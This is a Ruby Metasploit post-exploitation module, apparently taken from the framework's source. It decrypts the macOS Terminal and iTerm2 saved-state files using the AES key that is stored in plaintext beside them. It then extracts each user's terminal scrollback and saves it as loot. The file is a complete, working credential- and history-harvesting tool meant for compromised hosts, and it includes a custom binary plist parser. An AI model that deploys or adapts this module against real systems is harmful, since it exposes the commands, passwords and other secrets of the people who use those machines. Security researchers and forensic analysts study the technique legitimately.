##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'
require 'json'

# Binary plist parser ported from bplist.py by Willi Ballenthin
# https://gist.github.com/williballenthin/ab23abd5eec5bf5a272bfcfb2342ec04
#
# Supports all token types used by macOS SavedState artifacts:
#   null, bool, int, real, date, data, ASCII/Unicode string, UID, array, dict
class BplistParser
  MAGIC = 'bplist00'.b.freeze

  class ParseError < StandardError; end

  def initialize(data)
    @buf = data.b
  end

  def parse
    raise ParseError, 'Not a binary plist' unless @buf[0, 8] == MAGIC
    raise ParseError, 'Data too short' if @buf.length < 40

    # Trailer layout (last 32 bytes, all big-endian):
    #   6 unused | offset_size (1) | ref_size (1) | num_objects (8) | top_object (8) | offset_table_offset (8)
    _unused, offset_size, ref_size, num_objects, top_object, offset_table_offset =
      @buf[-32..].unpack('a6CCQ>Q>Q>')

    @ref_size = ref_size
    @object_offsets = @buf[offset_table_offset, num_objects * offset_size]
                      .unpack(uint_fmt(offset_size) * num_objects)
    @objects = Array.new(num_objects)
    @parsed = Array.new(num_objects, false)

    read_object(top_object)
  rescue ParseError
    raise
  rescue IndexError, TypeError, ArgumentError, RangeError => e
    raise ParseError, "Parse failed: #{e}"
  end

  private

  def uint_fmt(size)
    case size
    when 1 then 'C'
    when 2 then 'n'
    when 4 then 'N'
    when 8 then 'Q>'
    else raise ParseError, "Unsupported integer size: #{size}"
    end
  end

  # When token_l == 0xF the real count is stored inline as a sized integer.
  # Returns [new_pos, count].
  def read_extended_count(pos)
    m = @buf.getbyte(pos) & 0x3
    s = 1 << m
    [pos + 1 + s, @buf[pos + 1, s].unpack1(uint_fmt(s))]
  end

  def resolve_count(pos, token_l)
    token_l == 0xF ? read_extended_count(pos) : [pos, token_l]
  end

  def read_object(ref)
    return @objects[ref] if @parsed[ref]

    offset = @object_offsets[ref]
    token = @buf.getbyte(offset)
    token_h = token & 0xF0
    token_l = token & 0x0F
    pos = offset + 1

    obj = case token
          when 0x00 then nil
          when 0x08 then false
          when 0x09 then true
          when 0x0F then ''.b
          else
            case token_h
            when 0x10 # int
              s = 1 << token_l
              token_l >= 3 ? @buf[pos, s].unpack1('q>') : @buf[pos, s].unpack1(uint_fmt(s))

            when 0x20 # real
              case token_l
              when 2 then @buf[pos, 4].unpack1('g')
              when 3 then @buf[pos, 8].unpack1('G')
              end

            when 0x30 # date (token 0x33)
              Time.utc(2001, 1, 1) + @buf[pos, 8].unpack1('G')

            when 0x40 # data — return as binary String
              pos, s = resolve_count(pos, token_l)
              @buf[pos, s].b

            when 0x50 # ASCII string
              pos, s = resolve_count(pos, token_l)
              @buf[pos, s].encode('UTF-8', 'ASCII-8BIT', invalid: :replace, undef: :replace)

            when 0x60 # UTF-16BE string
              pos, s = resolve_count(pos, token_l)
              @buf[pos, s * 2].encode('UTF-8', 'UTF-16BE', invalid: :replace, undef: :replace)

            when 0x80 # UID — store as plain integer
              @buf[pos, 1 + token_l].unpack('C*').reduce(0) { |acc, b| (acc << 8) | b }

            when 0xA0 # array
              pos, s = resolve_count(pos, token_l)
              refs = @buf[pos, s * @ref_size].unpack(uint_fmt(@ref_size) * s)
              arr = []
              @objects[ref] = arr
              @parsed[ref] = true
              refs.each { |r| arr << read_object(r) }
              arr

            when 0xD0 # dict
              pos, s = resolve_count(pos, token_l)
              key_refs = @buf[pos, s * @ref_size].unpack(uint_fmt(@ref_size) * s)
              pos += s * @ref_size
              val_refs = @buf[pos, s * @ref_size].unpack(uint_fmt(@ref_size) * s)
              hsh = {}
              @objects[ref] = hsh
              @parsed[ref] = true
              key_refs.zip(val_refs).each { |k, v| hsh[read_object(k)] = read_object(v) }
              hsh

            else
              raise ParseError, "Unknown plist token: 0x#{token.to_s(16)}"
            end
          end

    @objects[ref] = obj unless @parsed[ref]
    @parsed[ref] = true
    obj
  end
end

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'macOS Terminal/iTerm2 Saved State Recovery',
        'Description' => %q{
          This module enumerates the saved state files for the Terminal and iTerm2
          applications on macOS 10.7–12 (Lion through Monterey).
          These files are encrypted with AES-128-CBC, but
          the key is stored in plaintext in the accompanying windows.plist file.
          The decrypted files contain a copy of what was sent to and from the
          terminal, which may include sensitive information.

          Tested against macOS 11.7.11.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die',                                        # msf module
          'Willi Ballenthin <willi.ballenthin@gmail.com>', # PoC
          'kshitij Kumar <kshitij.kumar@crowdstrike.com>'  # PoC
        ],
        'Platform' => ['osx'],
        'SessionTypes' => ['meterpreter', 'shell'],
        'References' => [
          # dead url, not sure what happened to it, leaving it here though since it was one of the original sources
          # ['URL', 'https://github.com/CrowdStrike/automactc/blob/master/modules/mod_terminalstate_v100.py'],
          ['URL', 'https://www.crowdstrike.com/en-us/blog/reconstructing-command-line-activity-on-macos/'],
          ['URL', 'https://gist.github.com/williballenthin/ab23abd5eec5bf5a272bfcfb2342ec04'],
          ['ATT&CK', Mitre::Attack::Technique::T1552_003_BASH_HISTORY] # Shell history according to the website https://attack.mitre.org/techniques/T1552/003/
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
    register_options([
      OptString.new('USER', [true, 'User to target, or ALL for all users', 'ALL'])
    ])
  end

  SAVED_STATE_APPS = [
    'com.apple.Terminal.savedState',
    'com.googlecode.iterm2.savedState'
  ].freeze

  def parse_binary_plist(data)
    BplistParser.new(data).parse
  end

  # Recursively converts parsed plist values to JSON-safe types.
  # Binary strings become "hex://..." since they may not be valid UTF-8.
  # Time objects become ISO-8601 strings. Everything else maps directly.
  def plist_to_json_value(obj)
    case obj
    when Hash then obj.transform_values { |v| plist_to_json_value(v) }
    when Array then obj.map { |v| plist_to_json_value(v) }
    when String
      obj.encoding == ::Encoding::ASCII_8BIT ? "hex://#{obj.unpack1('H*')}" : obj
    when Time then obj.utc.iso8601
    else obj
    end
  end

  def aes128_cbc_decrypt(key, ciphertext, iv = "\x00" * 16)
    cipher = OpenSSL::Cipher.new('AES-128-CBC')
    cipher.decrypt
    cipher.key = key
    cipher.iv = iv
    cipher.padding = 0
    cipher.update(ciphertext) + cipher.final
  end

  # Parses the custom struct wrapping the NSKeyedArchiver bplist inside a decrypted window state.
  #
  # Layout (all big-endian):
  #   uint32_t unk1
  #   uint32_t class_name_size
  #   char     class_name[class_name_size]
  #   char     magic[4]       # 'rchv'
  #   uint32_t plist_size
  #   uint8_t  plist[plist_size]
  #
  # Returns the raw bplist bytes, or nil if the magic is wrong.
  def parse_window_header(buf)
    buf = buf.b
    _unk1, class_name_size = buf.unpack('NN')
    offset = 8
    offset += class_name_size
    magic = buf[offset, 4]
    offset += 4
    return nil unless magic == 'rchv'

    plist_size = buf[offset, 4].unpack1('N')
    offset += 4
    buf[offset, plist_size]
  end

  # Parses one NSCR window state blob, finds its decryption key in windows_meta,
  # decrypts it, and returns [size, window_meta, inner_plist_bytes].
  # Returns [size, nil, nil] if the window metadata is missing.
  # Returns nil if the magic/version is invalid.
  def decrypt_window(windows_meta, buf)
    buf = buf.b
    magic = buf[0, 4]
    version = buf[4, 4]
    return nil unless magic == 'NSCR' && version == '1000'

    window_id, size = buf[8, 8].unpack('NN')
    ciphertext = buf[0x10, size - 0x10]

    window = windows_meta.find { |w| w['NSWindowID'] == window_id }
    unless window
      vprint_warning("  No metadata for window ID #{window_id}, skipping")
      return [size, nil, nil]
    end

    # NSDataKey is the raw 16-byte AES-128 key stored as binary data in the plist
    key = window['NSDataKey']
    plaintext = aes128_cbc_decrypt(key, ciphertext)
    plist_bytes = parse_window_header(plaintext)

    [size, window, plist_bytes]
  end

  # Extracts terminal scrollback content from a parsed NSKeyedArchiver plist.
  # $objects[33+] holds the terminal line strings per the SavedState format.
  # Terminal lines are stored as NSData (binary, ASCII_8BIT encoding).
  # Metadata strings (window geometry, class names, etc.) are NSString (UTF-8).
  def extract_terminal_content(state)
    objects = state['$objects']
    return nil if objects.nil? || objects.length <= 32

    content = objects[33..].select { |o| o.is_a?(String) && o.encoding == ::Encoding::ASCII_8BIT }
                           .map { |s| s.encode('UTF-8', 'ASCII-8BIT', invalid: :replace, undef: :replace) }
                           .join
    content.sub(/(\[Process completed\]\n).*/m, '\1')
  end

  def process_saved_state(path)
    windows_plist = "#{path}/windows.plist"
    data_file = "#{path}/data.data"

    unless file?(windows_plist) && file?(data_file)
      vprint_status("Not found: #{path}")
      return
    end

    print_status("Processing: #{path}")

    windows_meta = parse_binary_plist(read_file(windows_plist))
    data = read_file(data_file).b
    pos = 0

    while pos <= data.length - 0x10
      break unless data[pos, 4] == 'NSCR'

      result = decrypt_window(windows_meta, data[pos..])
      break if result.nil?

      size, window, plist_bytes = result
      break if size.nil? || size <= 0x10

      pos += size
      next if plist_bytes.nil? || window.nil?

      title = window.fetch('NSTitle', '(no title)')
      vprint_status("  Window: #{title}")

      begin
        state = parse_binary_plist(plist_bytes)
        state_json = JSON.pretty_generate(plist_to_json_value(state))
      rescue BplistParser::ParseError, JSON::GeneratorError => e
        vprint_error("  Failed to process window plist: #{e}")
        next
      end

      loot_json = store_loot(
        'osx.terminal.window.json',
        'application/json',
        session,
        state_json,
        'window_state.json',
        "macOS Terminal window state (JSON) - #{title}"
      )
      vprint_status("  Stored window state JSON to: #{loot_json}")

      content = extract_terminal_content(state)
      next if content.nil? || content.empty?

      print_good("  Recovered terminal history for window: #{title}")
      print_status(content)

      loot = store_loot(
        'osx.terminal.history',
        'text/plain',
        session,
        content,
        'terminal_history.txt',
        "macOS terminal history - #{title}"
      )
      print_good("  Stored to: #{loot}")
    end
  rescue BplistParser::ParseError => e
    print_error("Failed to parse #{windows_plist}: #{e}")
  end

  def run
    users = if datastore['USER'] == 'ALL'
              cmd_exec('ls /Users').split
            else
              [datastore['USER']]
            end

    users.each do |user|
      SAVED_STATE_APPS.each do |app|
        process_saved_state("/Users/#{user}/Library/Saved Application State/#{app}")
      end
    end
  end
end
